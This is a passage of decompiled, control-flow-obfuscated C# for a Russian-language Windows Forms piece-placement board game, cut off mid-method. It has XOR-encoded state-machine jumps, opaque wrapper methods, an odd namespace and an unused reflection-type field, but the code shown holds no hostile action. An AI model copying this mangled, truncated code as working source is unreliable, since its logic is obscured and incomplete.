using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 2058972874;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x184F2AC7u) % 6u)
					{
					case 5u:
						num = (int)((num2 * 659287708) ^ 0x3A11D470);
						continue;
					case 3u:
						num = ((int)num2 * -1682783653) ^ 0x53C9BFD8;
						continue;
					case 2u:
						Dark = dark;
						num = (int)(num2 * 1100194976) ^ -1212630404;
						continue;
					case 1u:
						Big = big;
						Square = square;
						Point = point;
						num = ((int)num2 * -126510865) ^ 0x31D81AEA;
						continue;
					default:
						return;
					case 0u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected O, but got Unknown
		bool flag = default(bool);
		int num6 = default(int);
		int num4 = default(int);
		double num9 = default(double);
		while (true)
		{
			int num = 1951387033;
			while (true)
			{
				uint num2;
				double num3;
				PictureBox[,] array;
				int num10;
				int num11;
				PictureBox obj;
				switch ((num2 = (uint)num ^ 0x6267E990u) % 24u)
				{
				case 23u:
					num = (int)((num2 * 1244684133) ^ 0x4AD203AB);
					continue;
				case 22u:
					num = ((int)num2 * -871559712) ^ -1359502274;
					continue;
				case 21u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -238391533) ^ -1375387519;
					continue;
				}
				case 20u:
					flag = num6 < 4;
					num = 1370378427;
					continue;
				case 19u:
					num = 1398103265;
					continue;
				case 18u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num4, num6]);
					num = (int)(num2 * 97960712) ^ -20642473;
					continue;
				case 17u:
					num = ((int)num2 * -58817741) ^ -500769323;
					continue;
				case 15u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num4, num6]);
					num = (int)(num2 * 2135638970) ^ -297194911;
					continue;
				case 13u:
					num6 = 0;
					num = 1668698322;
					continue;
				case 12u:
				{
					PictureBox[,] array2 = borderBox;
					int num12 = num4;
					int num13 = num6;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num6 + num9) * (double)size), 1 + num4 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num12, num13] = obj2;
					num = ((int)num2 * -1135658386) ^ 0x63346482;
					continue;
				}
				case 11u:
					num = (int)(num2 * 486829469) ^ -87614218;
					continue;
				case 10u:
					Form1.smethod_6((Control)(object)pictureBox[num4, num6], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = ((int)num2 * -564629505) ^ -2133226110;
					continue;
				case 9u:
					if (num6 >= 2)
					{
						num = ((int)num2 * -1478967605) ^ 0x186B585B;
						continue;
					}
					num3 = 0.0;
					goto IL_01e2;
				case 8u:
					num6++;
					num = ((int)num2 * -2135257241) ^ -1125529276;
					continue;
				case 7u:
					pictureBox = new PictureBox[4, 4];
					num = ((int)num2 * -1908052901) ^ -1945719647;
					continue;
				case 6u:
					InitializeComponent();
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = (int)(num2 * 2073757882) ^ -1577088133;
					continue;
				case 5u:
					num4++;
					num = (int)((num2 * 2133082103) ^ 0x2635D6E2);
					continue;
				case 4u:
					borderBox = new PictureBox[4, 4];
					num4 = 0;
					num = ((int)num2 * -910077757) ^ 0x2F6042DF;
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = 569905102;
						num8 = 569905102;
					}
					else
					{
						num7 = 619064336;
						num8 = 619064336;
					}
					num = num7 ^ (int)(num2 * 339301735);
					continue;
				}
				case 2u:
					num = (int)((num2 * 585709771) ^ 0x7DB1729A);
					continue;
				case 1u:
				{
					int num5;
					if (num4 >= 4)
					{
						num = 541264981;
						num5 = 541264981;
					}
					else
					{
						num = 1579447517;
						num5 = 1579447517;
					}
					continue;
				}
				case 0u:
					num3 = 4.1;
					goto IL_01e2;
				default:
					return;
				case 16u:
					break;
				case 14u:
					return;
					IL_01e2:
					num9 = num3;
					array = pictureBox;
					num10 = num4;
					num11 = num6;
					obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num6 + num9) * (double)size), 4 + num4 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num10, num11] = obj;
					num = 846535386;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = -964814554;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x99E22A3Bu) % 3u)
				{
				case 1u:
					goto IL_0033;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0033:
				num = (int)((num2 * 2063252872) ^ 0x1A2CC6D2);
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 2061691656;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4269C2D5u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000d:
				num = (int)(num2 * 544176756) ^ -694695219;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1849185744;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x79356E23u) % 9u)
				{
				case 8u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 615009774) ^ -122165976;
					continue;
				case 7u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 2099285322;
					continue;
				}
				case 6u:
					num = (int)((num2 * 1588212101) ^ 0x5D843FB);
					continue;
				case 4u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -795939728) ^ -949945454;
					continue;
				case 3u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 930077618;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1359484547;
						num4 = 1359484547;
					}
					else
					{
						num3 = 1484170928;
						num4 = 1484170928;
					}
					num = num3 ^ (int)(num2 * 1936847687);
					continue;
				}
				case 1u:
					num = ((int)num2 * -1819470932) ^ 0x75C99B66;
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		bool flag = default(bool);
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 1470838091;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x411FB604u) % 22u)
				{
				case 21u:
					flag = num5 < 4;
					num = 367832746;
					continue;
				case 19u:
					num = ((int)num2 * -822912056) ^ 0x264D19F3;
					continue;
				case 18u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num3], bool_0: false);
					num = ((int)num2 * -881059816) ^ 0x4A938F41;
					continue;
				case 17u:
					storage = new Figurine[4, 4];
					num = ((int)num2 * -1864865147) ^ -1304837470;
					continue;
				case 16u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 489481397) ^ -770770316;
					continue;
				case 15u:
					num5++;
					num = ((int)num2 * -1456784974) ^ -1838051569;
					continue;
				case 14u:
					num = (int)((num2 * 785475922) ^ 0x385C8600);
					continue;
				case 13u:
					board = new Figurine[4, 4];
					num = ((int)num2 * -1651276044) ^ -327913005;
					continue;
				case 12u:
					num3++;
					num = ((int)num2 * -1147673166) ^ -2024141233;
					continue;
				case 11u:
					num = ((int)num2 * -2118652902) ^ 0x528AF97E;
					continue;
				case 10u:
					num3 = 0;
					num = 864257975;
					continue;
				case 9u:
					num5 = 0;
					num = (int)((num2 * 113170064) ^ 0x46CCCA25);
					continue;
				case 8u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1299507265) ^ -366554836;
					continue;
				case 7u:
					num = ((int)num2 * -1918509037) ^ -504917834;
					continue;
				case 6u:
					Form1.smethod_5((Control)(object)borderBox[num5, num3], Color.White);
					num = (int)((num2 * 1018473215) ^ 0x775CA25C);
					continue;
				case 4u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = 185416874;
						num7 = 185416874;
					}
					else
					{
						num6 = 1052783480;
						num7 = 1052783480;
					}
					num = num6 ^ (int)(num2 * 1602070972);
					continue;
				}
				case 3u:
					storage[num5, num3] = new Figurine(num5 < 2, num3 % 2 == 0, num3 < 2, num5 % 2 == 1);
					num = (int)((num2 * 932858176) ^ 0x7614AD46);
					continue;
				case 2u:
					num = 263834151;
					continue;
				case 1u:
				{
					int num4;
					if (num3 < 4)
					{
						num = 1779763610;
						num4 = 1779763610;
					}
					else
					{
						num = 1730121617;
						num4 = 1730121617;
					}
					continue;
				}
				case 0u:
					Paint_Storage();
					num = ((int)num2 * -369158461) ^ 0x73603836;
					continue;
				default:
					return;
				case 5u:
					break;
				case 20u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num5 = default(float);
		int num4 = default(int);
		int num3 = default(int);
		float num6 = default(float);
		float num10 = default(float);
		float num7 = default(float);
		float num13 = default(float);
		bool big = default(bool);
		bool flag = default(bool);
		bool point = default(bool);
		while (true)
		{
			int num = -853701816;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAAFCD35Au) % 37u)
				{
				case 36u:
					Form1.smethod_28(graphics_, brush_, num5 + (float)(num4 * size), num5 + (float)(num3 * size), num6, num6);
					num = ((int)num2 * -1787473083) ^ 0x57AE023F;
					continue;
				case 35u:
					num10 = (float)size * num7;
					num = ((int)num2 * -1888327556) ^ 0x7C80DF99;
					continue;
				case 34u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -1275339185) ^ -1730910048;
					continue;
				case 33u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 75003061) ^ -1717919266;
					continue;
				case 32u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num5 + (float)(num4 * size), num5 + (float)(num3 * size), num6, num6);
					num = (int)(num2 * 84420901) ^ -147271424;
					continue;
				case 31u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 598113131) ^ -1447818761;
					continue;
				case 30u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -157342688) ^ 0x7832B536;
					continue;
				case 29u:
					num = (int)((num2 * 416210116) ^ 0x27EABDB1);
					continue;
				case 28u:
					num = ((int)num2 * -656425552) ^ 0x5EB4D8EF;
					continue;
				case 27u:
					brush_ = Form1.smethod_26();
					num = -241796522;
					continue;
				case 26u:
				{
					int num18;
					if (num3 < 4)
					{
						num = -725485740;
						num18 = -725485740;
					}
					else
					{
						num = -454537201;
						num18 = -454537201;
					}
					continue;
				}
				case 25u:
					num = ((int)num2 * -1491916371) ^ 0x7C8A98B8;
					continue;
				case 24u:
				{
					num6 = num10 * 0.9f / (float)Form1.smethod_27(2.0);
					int num11;
					int num12;
					if (board[num3, num4].Square)
					{
						num11 = -2087049472;
						num12 = -2087049472;
					}
					else
					{
						num11 = -1337260648;
						num12 = -1337260648;
					}
					num = num11 ^ ((int)num2 * -1720641462);
					continue;
				}
				case 23u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 487579563) ^ -524528803;
					continue;
				case 22u:
					num3 = 0;
					num = (int)((num2 * 1748778215) ^ 0x63BA38A0);
					continue;
				case 21u:
					num13 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -191142753;
					continue;
				case 20u:
				{
					int num20;
					int num21;
					if (big)
					{
						num20 = -1496647017;
						num21 = -1496647017;
					}
					else
					{
						num20 = -1074602746;
						num21 = -1074602746;
					}
					num = num20 ^ (int)(num2 * 156946570);
					continue;
				}
				case 19u:
				{
					int num19;
					if (num4 >= 4)
					{
						num = -568721852;
						num19 = -568721852;
					}
					else
					{
						num = -834629591;
						num19 = -834629591;
					}
					continue;
				}
				case 17u:
					flag = board[num3, num4] != null;
					num = ((int)num2 * -2096543141) ^ -811416181;
					continue;
				case 16u:
					num = -1461848490;
					continue;
				case 15u:
					num4++;
					num = -187694140;
					continue;
				case 14u:
				{
					int num16;
					int num17;
					if (point)
					{
						num16 = -1833505545;
						num17 = -1833505545;
					}
					else
					{
						num16 = -435872369;
						num17 = -435872369;
					}
					num = num16 ^ ((int)num2 * -1725842073);
					continue;
				}
				case 13u:
					num4 = 0;
					num = -187694140;
					continue;
				case 12u:
				{
					int num14;
					int num15;
					if (!flag)
					{
						num14 = 306944816;
						num15 = 306944816;
					}
					else
					{
						num14 = 1570399570;
						num15 = 1570399570;
					}
					num = num14 ^ (int)(num2 * 174543762);
					continue;
				}
				case 11u:
					num5 = (float)size * (num13 / 2f);
					num = (int)((num2 * 577185538) ^ 0x7C96144);
					continue;
				case 9u:
					num = ((int)num2 * -324343503) ^ 0x4E105C70;
					continue;
				case 8u:
					num3++;
					num = (int)((num2 * 1153756340) ^ 0x6616EA07);
					continue;
				case 7u:
					num7 = 0.7f;
					num = -1977186745;
					continue;
				case 6u:
					num = -2126287822;
					continue;
				case 5u:
					num13 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -979370543;
					continue;
				case 4u:
					num5 = (float)size * (num13 / 2f);
					num6 = num10 * 0.4f / (float)Form1.smethod_27(2.0);
					point = board[num3, num4].Point;
					num = ((int)num2 * -2099808669) ^ -1583465330;
					continue;
				case 3u:
				{
					int num8;
					int num9;
					if (!board[num3, num4].Dark)
					{
						num8 = 989363881;
						num9 = 989363881;
					}
					else
					{
						num8 = 408422431;
						num9 = 408422431;
					}
					num = num8 ^ (int)(num2 * 1261085258);
					continue;
				}
				case 2u:
					num7 = 1f;
					num = ((int)num2 * -1786320124) ^ 0x14AFD01D;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, brush_, num5 + (float)(num4 * size), num5 + (float)(num3 * size), num6, num6);
					num = -84315907;
					continue;
				case 0u:
					big = board[num3, num4].Big;
					num = -846048405;
					continue;
				default:
					return;
				case 10u:
					break;
				case 18u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		int num4 = default(int);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool dark = default(bool);
		float num5 = default(float);
		float num17 = default(float);
		float num16 = default(float);
		float num6 = default(float);
		float num9 = default(float);
		Brush brush_ = default(Brush);
		bool flag3 = default(bool);
		bool big = default(bool);
		bool point = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2 = 818902964;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x1E3E2551u) % 41u)
				{
				case 40u:
					num4++;
					num2 = 2030276098;
					continue;
				case 39u:
				{
					int num14;
					int num15;
					if (!flag2)
					{
						num14 = -1447934198;
						num15 = -1447934198;
					}
					else
					{
						num14 = -125484253;
						num15 = -125484253;
					}
					num2 = num14 ^ (int)(num3 * 1121283827);
					continue;
				}
				case 38u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num4]));
					num2 = (int)(num3 * 1057114844) ^ -861090182;
					continue;
				case 37u:
					dark = storage[num, num4].Dark;
					num2 = ((int)num3 * -1208890860) ^ -901486777;
					continue;
				case 36u:
					num2 = ((int)num3 * -741633133) ^ -642849099;
					continue;
				case 35u:
					num2 = (int)((num3 * 1109579064) ^ 0xB44F9E9);
					continue;
				case 34u:
					num2 = ((int)num3 * -1188167164) ^ 0xC334555;
					continue;
				case 33u:
					num5 = (float)size * (num17 / 2f) - 4f;
					num2 = (int)((num3 * 75318979) ^ 0x787BDF5);
					continue;
				case 32u:
					num16 = 0.7f;
					num2 = 1907332804;
					continue;
				case 31u:
					num2 = (int)((num3 * 109473077) ^ 0x34E541EC);
					continue;
				case 30u:
					num2 = ((int)num3 * -1934311024) ^ -544922761;
					continue;
				case 29u:
					flag2 = num4 < 4;
					num2 = 692759185;
					continue;
				case 28u:
				{
					num6 = num9 * 0.9f / (float)Form1.smethod_27(2.0);
					int num10;
					int num11;
					if (num4 >= 2)
					{
						num10 = 1709689791;
						num11 = 1709689791;
					}
					else
					{
						num10 = 32482937;
						num11 = 32482937;
					}
					num2 = num10 ^ ((int)num3 * -537933086);
					continue;
				}
				case 27u:
					num++;
					num2 = ((int)num3 * -1335490625) ^ 0x618CD90D;
					continue;
				case 26u:
					brush_ = Form1.smethod_26();
					num2 = 1044338938;
					continue;
				case 25u:
					flag3 = storage[num, num4] != null;
					num2 = 623811252;
					continue;
				case 24u:
					big = storage[num, num4].Big;
					num2 = 37792146;
					continue;
				case 23u:
				{
					int num22;
					int num23;
					if (!dark)
					{
						num22 = -89738028;
						num23 = -89738028;
					}
					else
					{
						num22 = -1967106118;
						num23 = -1967106118;
					}
					num2 = num22 ^ (int)(num3 * 1357842011);
					continue;
				}
				case 22u:
					Form1.smethod_30((Control)(object)pictureBox[num, num4]);
					num2 = 1634357627;
					continue;
				case 21u:
					num16 = 1f;
					num2 = (int)(num3 * 531830037) ^ -1492500309;
					continue;
				case 20u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -156209122) ^ -619077262;
					continue;
				case 19u:
					Form1.smethod_20(pictureBox[num, num4], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num4]), Form1.smethod_16((Control)(object)pictureBox[num, num4])));
					num2 = ((int)num3 * -853472245) ^ 0x87785F6;
					continue;
				case 18u:
					num2 = (int)(num3 * 1822101214) ^ -24789755;
					continue;
				case 17u:
				{
					int num20;
					int num21;
					if (!point)
					{
						num20 = -951231016;
						num21 = -951231016;
					}
					else
					{
						num20 = -1155682176;
						num21 = -1155682176;
					}
					num2 = num20 ^ ((int)num3 * -75215923);
					continue;
				}
				case 16u:
					num9 = (float)size * num16;
					num2 = (int)((num3 * 1716374927) ^ 0x426FB875);
					continue;
				case 15u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num5, num5, num6, num6);
					num2 = ((int)num3 * -2124057751) ^ 0x3E002B20;
					continue;
				case 14u:
					num2 = ((int)num3 * -765188926) ^ -453780318;
					continue;
				case 12u:
					num2 = (int)(num3 * 1720534303) ^ -453177088;
					continue;
				case 11u:
					num17 = 1f - num16 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = 2124705282;
					continue;
				case 10u:
					num2 = ((int)num3 * -2108588726) ^ -1988750806;
					continue;
				case 9u:
				{
					int num18;
					int num19;
					if (flag3)
					{
						num18 = -590075376;
						num19 = -590075376;
					}
					else
					{
						num18 = -1315167506;
						num19 = -1315167506;
					}
					num2 = num18 ^ (int)(num3 * 450479395);
					continue;
				}
				case 8u:
					flag = num < 4;
					num2 = 1376721588;
					continue;
				case 7u:
					num17 = 1f - num16 * 0.4f / (float)Form1.smethod_27(2.0);
					num5 = (float)size * (num17 / 2f) - 4f;
					num6 = num9 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num, num4].Point;
					num2 = 171297034;
					continue;
				case 6u:
				{
					int num12;
					int num13;
					if (!big)
					{
						num12 = -876687586;
						num13 = -876687586;
					}
					else
					{
						num12 = -1478675623;
						num13 = -1478675623;
					}
					num2 = num12 ^ ((int)num3 * -1639815582);
					continue;
				}
				case 5u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -27850004;
						num8 = -27850004;
					}
					else
					{
						num7 = -595429191;
						num8 = -595429191;
					}
					num2 = num7 ^ (int)(num3 * 1067207623);
					continue;
				}
				case 4u:
					num2 = ((int)num3 * -645068544) ^ 0x4A0155DF;
					continue;
				case 3u:
					Form1.smethod_28(graphics_, brush_, num5, num5, num6, num6);
					num2 = ((int)num3 * -1665830184) ^ -769605555;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, brush_, num5, num5, num6, num6);
					num2 = 14830770;
					continue;
				case 0u:
					num4 = 0;
					num2 = 1683589333;
					continue;
				default:
					return;
				case 2u:
					break;
				case 13u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num8 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		int num7 = default(int);
		while (true)
		{
			int num = 1533037618;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6403ED20u) % 30u)
				{
				case 29u:
					num8 = 0;
					num = ((int)num2 * -1031915844) ^ -665238601;
					continue;
				case 28u:
					num = ((int)num2 * -254931811) ^ 0x5C4DD425;
					continue;
				case 27u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 290945035) ^ -1657430327;
					continue;
				case 26u:
					flag2 = turn;
					num = (int)((num2 * 425007164) ^ 0x28255306);
					continue;
				case 25u:
					num = ((int)num2 * -610685319) ^ -325523414;
					continue;
				case 24u:
					step = 0;
					num = (int)((num2 * 1023046302) ^ 0x7C33E72F);
					continue;
				case 22u:
				{
					int num5 = Form1.smethod_33(rnd, 4);
					int num6 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Blue);
					num = ((int)num2 * -1331442630) ^ 0x367C0B7D;
					continue;
				}
				case 21u:
					step = 1;
					num = (int)((num2 * 655640491) ^ 0x1A1F62BC);
					continue;
				case 20u:
					num = (int)((num2 * 939052538) ^ 0x27F7B9C5);
					continue;
				case 19u:
					flag = num7 < 4;
					num = 1103853962;
					continue;
				case 18u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -53908220) ^ -1275689084;
					continue;
				case 17u:
					num = (int)((num2 * 1817075174) ^ 0x28614B4F);
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (!flag2)
					{
						num10 = 996937301;
						num11 = 996937301;
					}
					else
					{
						num10 = 1862290201;
						num11 = 1862290201;
					}
					num = num10 ^ (int)(num2 * 1092209837);
					continue;
				}
				case 15u:
				{
					int num9;
					if (num8 < 4)
					{
						num = 461600268;
						num9 = 461600268;
					}
					else
					{
						num = 1391213877;
						num9 = 1391213877;
					}
					continue;
				}
				case 14u:
					Form1.smethod_36(timer1);
					num = (int)((num2 * 412718651) ^ 0x7A510D01);
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -865212757) ^ -1781510897;
					continue;
				case 12u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -430124926) ^ 0x1B222454;
					continue;
				case 11u:
					num = ((int)num2 * -986220588) ^ 0x4028088C;
					continue;
				case 10u:
					num8++;
					num = (int)((num2 * 1877195601) ^ 0x2A60DAF);
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 1213189438;
					continue;
				case 7u:
					num = ((int)num2 * -833536576) ^ -1511659549;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)pictureBox[num8, num7], bool_0: true);
					num7++;
					num = 5751427;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -837594022) ^ 0xB54410B;
					continue;
				case 4u:
					num7 = 0;
					num = 5751427;
					continue;
				case 3u:
					num = (int)((num2 * 458727006) ^ 0x4670123D);
					continue;
				case 2u:
					num = (int)((num2 * 722252616) ^ 0x5E1466B4);
					continue;
				case 1u:
					num = 359132542;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 639804410;
						num4 = 639804410;
					}
					else
					{
						num3 = 292071596;
						num4 = 292071596;
					}
					num = num3 ^ (int)(num2 * 107841248);
					continue;
				}
				default:
					return;
				case 8u:
					break;
				case 23u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 627109500;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3B3AE835u) % 4u)
				{
				case 3u:
					num = (int)((num2 * 896212842) ^ 0x1F8D734D);
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 1628821474) ^ -1476481172;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Expected O, but got Unknown
		int num4 = default(int);
		int num6 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		Point point = default(Point);
		int num5 = default(int);
		while (true)
		{
			int num = 1323558785;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0x2F2D3EC4u) % 24u)
				{
				case 22u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 422129178) ^ -821443643;
					continue;
				case 21u:
					num4++;
					num = ((int)num2 * -1810787286) ^ -1160307268;
					continue;
				case 20u:
					if (storage[num6, num3] != null)
					{
						num = 2066252630;
						continue;
					}
					num9 = 0;
					goto IL_005c;
				case 19u:
					num3 -= 4;
					num = ((int)num2 * -1587778228) ^ 0x1ABD4E2C;
					continue;
				case 18u:
					flag2 = num4 < 4;
					num = 874006875;
					continue;
				case 17u:
					num4 = 0;
					num = (int)((num2 * 2008005119) ^ 0x644F812);
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = -845616049;
						num11 = -845616049;
					}
					else
					{
						num10 = -1799690072;
						num11 = -1799690072;
					}
					num = num10 ^ (int)(num2 * 1781162468);
					continue;
				}
				case 15u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = -866903922;
						num14 = -866903922;
					}
					else
					{
						num13 = -1255960937;
						num14 = -1255960937;
					}
					num = num13 ^ (int)(num2 * 1887288543);
					continue;
				}
				case 14u:
					num6 = point.Y / size;
					num = (int)(num2 * 1900549704) ^ -360669443;
					continue;
				case 13u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)((num2 * 195469228) ^ 0x717EAF96);
					continue;
				case 12u:
					num5 = 0;
					num = 1497225348;
					continue;
				case 10u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num6, num3]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_005c;
				case 9u:
					num = (int)(num2 * 1409603568) ^ -544965986;
					continue;
				case 8u:
				{
					int num12;
					if (num5 < 4)
					{
						num = 1678465647;
						num12 = 1678465647;
					}
					else
					{
						num = 813330369;
						num12 = 813330369;
					}
					continue;
				}
				case 7u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -256996051;
						num8 = -256996051;
					}
					else
					{
						num7 = -2145378209;
						num8 = -2145378209;
					}
					num = num7 ^ (int)(num2 * 1289365753);
					continue;
				}
				case 6u:
					Form1.smethod_5((Control)(object)borderBox[num6, num3], Color.Red);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 2013534347) ^ 0x43131D98);
					continue;
				case 5u:
					num = ((int)num2 * -1488192996) ^ -992847560;
					continue;
				case 4u:
					flag = num3 > 1;
					num = ((int)num2 * -313767665) ^ -1139693368;
					continue;
				case 3u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.White);
					num5++;
					num = 1497225348;
					continue;
				case 2u:
					num = ((int)num2 * -858964685) ^ 0x69D6F4BB;
					continue;
				case 1u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num3 = point.X / size;
					num = (int)(num2 * 340659271) ^ -396030273;
					continue;
				case 0u:
					num = (int)(num2 * 912281817) ^ -159751169;
					continue;
				default:
					return;
				case 23u:
					break;
				case 11u:
					return;
					IL_005c:
